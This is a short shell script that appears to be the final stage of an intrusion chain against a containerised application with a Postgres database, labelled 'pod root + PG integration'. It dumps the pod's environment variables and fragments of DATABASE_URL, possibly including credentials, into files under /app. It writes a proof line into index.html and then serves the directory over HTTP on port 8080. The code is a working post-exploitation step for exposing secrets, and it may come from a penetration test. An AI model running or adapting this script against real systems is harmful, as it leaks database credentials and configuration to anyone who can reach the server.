#!/bin/sh
# S14 FINAL CHAIN: pod root + PG integration (DATABASE_URL injected)
{
  echo "=== ENV (integrated) ==="
  env | sort | head -40
  echo "=== DATABASE_URL (redacted proof) ==="
  if [ -n "$DATABASE_URL" ]; then
    echo "len=${#DATABASE_URL} head=${DATABASE_URL:0:30} tail=${DATABASE_URL: -12}"
    echo "host part: $(echo $DATABASE_URL | cut -d@ -f2 | cut -d/ -f1)"
  else
    echo "NO DATABASE_URL"
  fi
} > /app/chain3.txt 2>&1
printf 'CHAIN3 host=%s uid=%s db=%s\n' "$(hostname)" "$(id -u)" "${DATABASE_URL:0:25}" > /app/index.html
exec python3 -m http.server 8080
